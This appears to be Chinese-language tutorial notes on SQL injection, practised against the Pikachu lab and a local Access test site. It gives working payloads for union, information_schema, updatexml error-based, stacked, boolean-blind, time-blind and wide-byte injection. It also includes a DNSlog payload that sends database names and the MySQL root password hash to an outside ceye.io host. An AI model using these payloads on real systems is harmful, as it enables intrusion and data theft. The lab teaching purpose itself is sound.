href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_header/sqli_header_login.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_header/sqli_header_login.php</a></p><p>在http请求头，cookie字段后面，添加SQL注入信息</p><p><img src="/img/oldboy/1-17.png"></p><h3 id="HEAD方式进行提交"><a href="#HEAD方式进行提交" class="headerlink" title="HEAD方式进行提交"></a>HEAD方式进行提交</h3><p>典型页面：<a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_header/sqli_header.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_header/sqli_header.php</a></p><p><img src="/img/oldboy/1-14.png"></p><p>使用bp抓包</p><p><img src="/img/oldboy/1-13.png"></p><p>验证方式：通过Bp重发器，在UA后面加入’进行验证</p><p><img src="/img/oldboy/1-15.png"></p><h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><h3 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h3><p>传入数据库的信息是数值信息</p><p>典型页面：<a href="http://192.168.88.128:90/pikachu/vul/sqli/sqli_id.php">http://192.168.88.128:90/pikachu/vul/sqli/sqli_id.php</a></p><p> 交互原理：</p><p>   $id&#x3D;$_POST[‘id’];</p><p>   $query&#x3D;”select username,email from member where id&#x3D;$id”;<br>   id&#x3D;1<br>   select username,email from member where id&#x3D;1;<br>   利用漏洞：会将所有数据信息都展示出来<br>   id&#x3D;1 or 1&#x3D;1</p><h3 id="字符类型"><a href="#字符类型" class="headerlink" title="字符类型"></a>字符类型</h3><p>传入数据的信息是字符信息</p><p>典型页面：<a href="http://192.168.88.128:90/pikachu/vul/sqli/sqli_str.php">http://192.168.88.128:90/pikachu/vul/sqli/sqli_str.php</a></p><p>   交互原理：<br>   $name&#x3D;$_GET[‘name’];</p><p>   $query&#x3D;”select id,email from member where username&#x3D;’$name’”;<br>   name&#x3D;xiaoq<br>   select id,email from member where username&#x3D;’xiaoq’<br>   利用漏洞：<br>   xiaoq’ or 1&#x3D;1 #</p><h3 id="搜索类型"><a href="#搜索类型" class="headerlink" title="搜索类型"></a>搜索类型</h3><p>  模糊匹配查询数据，传输数据库信息是任意字符信息</p><p>  典型页面：<a href="http://192.168.88.128:90/pikachu/vul/sqli/sqli_search.php">http://192.168.88.128:90/pikachu/vul/sqli/sqli_search.php</a><br>  交互原理：<br>   $name&#x3D;$_GET[‘name’];</p><p>   $query&#x3D;”select username,id,email from member where username like ‘%$name%‘“;<br>   name&#x3D;xiaoq<br>   select username,id,email from member where username like ‘%xiaoq%‘</p><p>   利用漏洞： </p><p>   select username,id,email from member where username like ‘%xiaoq%‘ or 1&#x3D;1 #%‘</p><p>   xxx%‘ or 1&#x3D;1 #</p><h3 id="特殊类型"><a href="#特殊类型" class="headerlink" title="特殊类型"></a>特殊类型</h3><p> 精确匹配查询数据，传输数据库信息是任意字符信息，也称为XX型</p><p> 典型页面：<a href="http://192.168.88.128:90/pikachu/vul/sqli/sqli_x.php">http://192.168.88.128:90/pikachu/vul/sqli/sqli_x.php</a><br>   交互原理：<br>   $name&#x3D;$_GET[‘name’];</p><p>   $query&#x3D;”select id,email from member where username&#x3D;(‘$name’)”;<br>   name&#x3D;xiaoq<br>   select id,email from member where username&#x3D;(‘xiaoq’)<br>   利用漏洞：<br>   w’) or 1&#x3D;1 #</p><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>union操作符用于合并两个或多个SQL语句指令信息，得到联合的查询结果；</p><p>使用示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">MySQL [xiaoq]&gt; select name,age from stu where name=&#x27;zhangwu&#x27; union select name,age from teac where name=&#x27;zhangwu&#x27;;</span><br><span class="line">+---------+------+</span><br><span class="line">| name    | age  |</span><br><span class="line">+---------+------+</span><br><span class="line">| zhangwu |   24 |</span><br><span class="line">+---------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#union all 不会进行重复值的过滤</span><br><span class="line">MySQL [xiaoq]&gt; select name,age from stu where name=&#x27;zhangwu&#x27; union all select name,age from teac where name=&#x27;zhangwu&#x27;;</span><br><span class="line">+---------+------+</span><br><span class="line">| name    | age  |</span><br><span class="line">+---------+------+</span><br><span class="line">| zhangwu |   24 |</span><br><span class="line">| zhangwu |   24 |</span><br><span class="line">+---------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>典型页面：<a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php</a></p><p>注意：当主查询语句和子查询语句中的字段个数不一致时，将会报错<br>select name,age,render from stu where name&#x3D;’zhangwu’ union all select name,age from teac where name&#x3D;’zhangwu’;<br>错误提示：The used SELECT statements have a different number of columns</p><p>解决方法思路：需要判断主查询语句的字段个数，通过order by 排序实现</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a\%&#x27;  order by 3 #</span><br><span class="line">    用户名中含有a\%&#x27; order by 3 #的结果如下：</span><br><span class="line"></span><br><span class="line">    username：allen</span><br><span class="line">    uid:2</span><br><span class="line">    email is: allen@pikachu.com</span><br><span class="line"></span><br><span class="line">    username：grady</span><br><span class="line">    uid:4</span><br><span class="line">    email is: grady@pikachu.com</span><br><span class="line"></span><br><span class="line">a\%&#x27;  order by 4 #</span><br><span class="line">报错：Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#说明 主查询语句中字段数量为3</span></span></span><br></pre></td></tr></table></figure><p>知道字段数之后通过占位进行注入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">a\%&#x27; union select username,email,version() from member #</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    用户名中含有a\%&#x27; union select username,email,version() from member #的结果如下：</span><br><span class="line"></span><br><span class="line">    username：allen</span><br><span class="line">    uid:2</span><br><span class="line">    email is: allen@pikachu.com</span><br><span class="line">    username：grady</span><br><span class="line">    uid:4</span><br><span class="line">    email is: grady@pikachu.com</span><br><span class="line"></span><br><span class="line">    username：vince</span><br><span class="line">    uid:vince@pikachu.com</span><br><span class="line">    email is: 5.5.53</span><br><span class="line">.................</span><br><span class="line"></span><br><span class="line">常用的函数：</span><br><span class="line">USER();VERSION();  DATABASE();  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="information-schema注入"><a href="#information-schema注入" class="headerlink" title="information_schema注入"></a>information_schema注入</h3><p>information_schema是MYSQL 5.0之后数据库中默认的数据库，此数据库中有数据库的元数据信息，包含了一些数据库统计信息（有哪些库、表、字段、数据存储量、应用索引数量）</p><p>典型页面：<a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php</a></p><p><strong>应用方式</strong></p><ol><li>获取数据库的库名<ol><li>vince’ union select database(),user(),3#%</li></ol></li><li>获取数据库的表名<ol><li>u’ union select table_schema,table_name,3 from information_schema.tables where table_schema&#x3D;’pikachu’#</li></ol></li><li>获取数据库表中的字段<ol><li>k’ union select table_name,column_name,3 from information_schema.columns where table_name&#x3D;’user’#%</li></ol></li><li>获取数据库的数据<ol><li>kobe’union select username ,password,3 from users#%</li></ol></li></ol><p>常规方法应用步骤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1</span>、获取所有数据库表明</span><br><span class="line"><span class="keyword">SELECT</span> SCHEMA_NAME <span class="keyword">FROM</span> information_schema.SCHEMATA;</span><br><span class="line"></span><br><span class="line">#<span class="number">2</span>、获取当前数据库的表名</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"></span><br><span class="line">#<span class="number">3</span>、获取指定表的列名</span><br><span class="line"><span class="keyword">SELECT</span> COLUMN_NAME <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> TABLE_NAME <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">#<span class="number">4</span>、获取所有数据库的表名</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_SCHEMA, TABLE_NAME <span class="keyword">FROM</span> information_schema.TABLES;</span><br><span class="line"></span><br><span class="line">#<span class="number">5</span>、获取所有数据库的列名</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME <span class="keyword">FROM</span> information_schema.COLUMNS;</span><br><span class="line"></span><br><span class="line">#<span class="number">6</span>、获取表的数据</span><br><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure><h3 id="报错函数注入"><a href="#报错函数注入" class="headerlink" title="报错函数注入"></a>报错函数注入</h3><p>报错注入顾名思义主要是利用<strong>数据库报错</strong>来进行判断是否存在注入点，如果不符合数据库语法规则就会产生错误</p><p>常用函数：</p><p>​updatexml（）:函数是MYSQL对XML文档数据进行查询和修改的XPATH函数.</p><p>​extractvalue（）     :函数也是MYSQL对XML文档数据进行查询的XPATH函数.<br>​floor（）   :MYSQL中用来取整的函数.</p><p>典型网站：<a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php</a></p><p>updatexml实战测试：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1</span>、爆数据库版本信息</span><br><span class="line">a\<span class="operator">%</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#2、爆数据库当前用户</span></span><br><span class="line"><span class="string">a\%&#x27;</span> <span class="keyword">and</span>  updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)#  </span><br><span class="line"></span><br><span class="line">#<span class="number">3</span>、爆数据库</span><br><span class="line">a\<span class="operator">%</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#4、爆表,但是反馈回的错误表示只能显示一行，所以采用limit来一行一行显示</span></span><br><span class="line"><span class="string">a\%&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br><span class="line"></span><br><span class="line">#<span class="number">5</span>、爆字段</span><br><span class="line">a\<span class="operator">%</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;limit 2,1)),0)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#6、爆字段内容</span></span><br><span class="line"><span class="string">a\%&#x27;</span> <span class="keyword">and</span>  updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)#</span><br></pre></td></tr></table></figure><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>c</p><blockquote><p>与union区别：</p><p>堆叠注入方式和union联合注入方式类似，都是实现多个SQL语句命令拼接，同时执行操作，但是union联合注入只能实现多个select语句拼接，不能实现其他语句拼接，然而堆叠注入，还可以实现拼接其他SQL类型语句，实现操作数据库。</p></blockquote><p>PS：需要关注用户权限  </p><p>举例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>新建一个表</span><br><span class="line"> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">create table</span> test <span class="keyword">like</span> users;</span><br><span class="line"> </span><br><span class="line"><span class="number">2.</span>删除上面新建的test表</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">drop</span> <span class="keyword">table</span> test;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>查询数据</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure><h3 id="盲注方式"><a href="#盲注方式" class="headerlink" title="盲注方式"></a>盲注方式</h3><p>适用场景：应用程序就会返回一个“通用的”的页面，或者重定向一个通用页面（可能为网站首页）。</p><h4 id="基于布尔类型的SQL盲注"><a href="#基于布尔类型的SQL盲注" class="headerlink" title="基于布尔类型的SQL盲注"></a>基于布尔类型的SQL盲注</h4><ul><li>页面仅返回两种状态（如登录成功&#x2F;失败、数据存在&#x2F;不存在）</li><li>无法通过联合查询或报错注入直接获取数据</li></ul><p>select ascii(substr(database(),1,1))&gt;xx;<br>通过对比ascii码的长度，判断出数据库表名的第一个字符。</p><p>database() – 输出数据库名称信息    pikachu<br>1,1        – 取出数据库名称第一个字符p<br>substr()   – 数据库名称字符调取出来       p<br>ascii   – 将字符信息转成编码数值       112（是可以识别，也不会显示）</p><p>&gt;113 &lt;111 &#x3D;112  – 通过112编码反向处理 112 - p（确认）</p><p>vince’ and ascii(substr(database(),1,1))&#x3D;112#  – 推断出数据库名称第一个字母 p </p><p><strong>流程举例</strong></p><p>1、判断注入点以及闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>  <span class="comment">-- 正常响应（True）</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span>  <span class="comment">-- 异常响应（False）</span></span><br></pre></td></tr></table></figure><p>2、获取数据库名</p><p>①判断数据库名长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=8 --+</span></span><br></pre></td></tr></table></figure><p>通过二分法逐步调整数值（如 &gt;10、&lt;5）最终确定长度。</p><p>②逐个字符猜解数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))=115 --+</span></span><br></pre></td></tr></table></figure><p>通过ASCII码逐个字符判断（substr(database(),n,1) 截取第n位字符）</p><p>3、获取表名</p><p>①判断表数量及表名长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=2 --+</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">6</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>②逐字符猜解表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=109 --+</span></span><br></pre></td></tr></table></figure><p>4、获取字段名</p><p>①判断字符数量及字段长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;)=3 --+</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>②逐字符猜解字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),1,1))=105 --+</span></span><br></pre></td></tr></table></figure><p>5、提取数据内容</p><p>①判断数据长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select username from users limit 0,1))=5 --+</span></span><br></pre></td></tr></table></figure><p>②逐字符猜解数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select username from users limit 0,1),1,1))=97 --+</span></span><br></pre></td></tr></table></figure><h4 id="基于时间类型的SQL盲注"><a href="#基于时间类型的SQL盲注" class="headerlink" title="基于时间类型的SQL盲注"></a>基于时间类型的SQL盲注</h4><p>基于时间类型的SQL盲注（Time-Based Blind SQL Injection）是一种通过观察数据库响应时间差异来推断信息的注入技术，常用于无法直接获取数据回显的场景。</p><p>常用延时函数：</p><ul><li>MySQL：SLEEP(5)、BENCHMARK(10000000,MD5(‘test’)) </li><li>SQL Server：WAITFOR DELAY ‘0:0:5’ </li><li>PostgreSQL：PG_SLEEP(5)</li></ul><p>测试方法：</p><p><strong>一、判断注入点及注入类型</strong></p><ul><li>基础测试</li></ul><p>在参数后添加延时函数，观察页面响应时间是否显著增加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND SLEEP(5)--</span><br></pre></td></tr></table></figure><p>如果页面响应延迟约5秒，则可能存在时间盲注漏洞。</p><ul><li><p>闭合方式测试</p><p>根据参数闭合方式调整Payload（如单引号、双引号等）：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; OR IF(1=1,SLEEP(5),0)--</span><br></pre></td></tr></table></figure><p><strong>二、获取数据库信息</strong> </p><p>1.获取数据库名 </p><p>判断数据库名长度  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF(LENGTH(DATABASE())=N, SLEEP(5),0)-- </span><br></pre></td></tr></table></figure><p> 逐步替换N，直到响应延迟，确定长度。 </p><p>​逐字符猜解数据库名  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF(ASCII(SUBSTR(DATABASE(),1,1))=N, SLEEP(5),0)-- </span><br></pre></td></tr></table></figure><p>替换N为ASCII码（如97对应字符a），逐个字符猜解。  </p><p>2.获取表名</p><p> 猜解表数量  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=N, SLEEP(5),0)-- </span><br></pre></td></tr></table></figure><p> 逐表猜解表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1),1,1))=N, SLEEP(5),0)-- </span><br></pre></td></tr></table></figure><p>通过LIMIT遍历所有表，逐字符猜解表名。  </p><p>3.获取字段名 </p><p>猜解字段数量 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#x27;users&#x27;)=N, SLEEP(5),0)-- </span><br></pre></td></tr></table></figure><p>逐字段猜解名称 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF(ASCII(SUBSTR((SELECT columnname FROM informationschema.columns WHERE table_name=&#x27;users&#x27; LIMIT 0,1),1,1))=N, SLEEP(5),0)- </span><br></pre></td></tr></table></figure><p>4.提取数据 </p><p>猜解字段内容 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF(ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1))=N, SLEEP(5),0)-</span><br></pre></td></tr></table></figure><h4 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h4><p><a href="https://www.cnblogs.com/Xy--1/p/12896599.html">DNSlog注入学习 - Lushun - 博客园</a></p><p>以sql盲注为例，后端数据库用的mysql数据库，说一下用dnslog回显只能用于windows系统，为什么呢。因为在利用sql盲注进行DNSlog回显时，需要用到load_file函数，这个函数可以进行DNS请求。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.zs69k2.ceye.io\\abc&#x27;))),1,0)--+</span><br></pre></td></tr></table></figure><p><img src="/img/oldboy/1884700-20210210181611688-1713394196.png" alt="img"></p><p>利用concat()函数将查询的数据库名和域名拼接，执行后查看DNSlog</p><p><img src="/img/oldboy/1884700-20210210181632406-1270734005.png" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> LIMIT <span class="number">1</span>),<span class="string">&#x27;.mysql.ip.port.b182oj.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>当php开启magic_quotes_gpc（魔术引号开关，可以将SQL注入语句中的单引号转换为字符信息）宽字节注入可以在开启魔术引号开启之后，还原引号的功能</p><p>magic_quotes_gpc：通过在引号’前面添加转义字符”\“使引号’失去含义</p><p><strong>思路：</strong></p><p>&#39; -&gt; url编码 -&gt; %5c%27 -&gt; %df%5c %27  -&gt; 縗’</p><p>%df &#x3D;&#x3D; ß<br>%df%5c&#x3D;&#x3D; 縗</p><p>通过在%5c前面添加%df从而使%27逃匿出来，组成为<u>%df%5c%</u>27</p><p>注意：宽字节注入时，需要确定数据库的字符集为GBK编码</p><h2 id="实战应用"><a href="#实战应用" class="headerlink" title="实战应用"></a>实战应用</h2><h3 id="数据库类型确认方式"><a href="#数据库类型确认方式" class="headerlink" title="数据库类型确认方式"></a>数据库类型确认方式</h3><h4 id="使用内置变量爆数据库类型"><a href="#使用内置变量爆数据库类型" class="headerlink" title="使用内置变量爆数据库类型"></a>使用内置变量爆数据库类型</h4><p>“User”是SQL Server的一个内置变量，它的值是当前连接的用户名，其变量类型为“nvarchar”字符型。通过提交查询该变量，根据返回的出错信息即可得知数据库类型。</p><p>使用语句：</p><p>​and user&gt;0</p><p>​该查询语句会将user对应的nvarchar型值与int数字型的0进行对比，两个数据类型不一致，因此会返回出错信息。</p><p><strong>1、MsSQL报错信息：</strong></p><p>​Microsoft OLE DB Provider for SQL Server 错误’80040e21’</p><p>​将nvarchar值’****’转换为数据类型为int的列时发生语法错误。</p><p><strong>2、Access报错信息：</strong></p><p>​Microsoft OLE DB Provider Drivers ODBC Drivers 错误 ‘80040e21’</p><p>​ODBC 驱动程序不支持所需的属性。 </p><p><strong>3、Mysql报错信息：</strong></p><p>​<strong>Warning</strong>:  mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>C:\phpstudy\WWW\mysql\sql.php</strong> on line 12</p><h4 id="内置数据表爆数据库类型"><a href="#内置数据表爆数据库类型" class="headerlink" title="内置数据表爆数据库类型"></a>内置数据表爆数据库类型</h4><p>如果服务器IIS不允许返回错误提示，通常可以通过数据库内置的系统数据表来进行判断。在注入点后提交如下查询语句。</p><p>and  (select count(*)  from sysobjects)&gt;0</p><p>and (select count(*)  from msysobjects)&gt;0</p><p><strong>1、MsSQL报错信息：</strong></p><p>​在MS SQL Serve:存在系统表[sysobjects]，不存在[msysobjects]系统表</p><p>​Microsoft OLE DB Provider for SQL Server 错误 ‘80040e37’</p><p>​对象名 ‘msysobjects’ 无效。</p><p>​&#x2F;home&#x2F;yz&#x2F;yu&#x2F;show.asp, 行 8</p><p><strong>2、Access报错信息：</strong></p><p>​Access存在系统表[msysobjects]，不存在“sysobjects”表。</p><p>​Microsoft OLE DB Provider for ODBC Drivers 错误 ‘80040e37’</p><p>​&#x2F;home&#x2F;yz&#x2F;yu&#x2F;show.asp, 行 8</p><p>​[Microsoft][ODBC Microsoft Access Driver] Microsoft Jet数据库引擎找不到输入表或查询’sysobjects’。确定它是否存在，以及它的名称的拼写是否正确。</p><p><strong>3、Mysql报错信息：</strong></p><p>​<strong>Warning</strong>:  mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>C:\phpstudy\WWW\mysql\sql.php</strong> on line 12</p><h3 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h3><h4 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h4><h5 id="爆出数据库类型"><a href="#爆出数据库类型" class="headerlink" title="爆出数据库类型"></a>爆出数据库类型</h5><p>典型网站：<a href="http://192.168.138.130:81/news_view.asp?id=14">http://192.168.138.130:81/news_view.asp?id=14</a></p><p>通过方法一：</p><p>​<a href="http://192.168.138.130:81/news_view.asp?id=14%5C%20and%5C%20user%5C%3E0">http://192.168.138.130:81/news_view.asp?id=14\%20and\%20user\%3E0</a></p><p>​Microsoft OLE DB Provider for ODBC Drivers 错误 ‘80040e21’</p><p>​ODBC 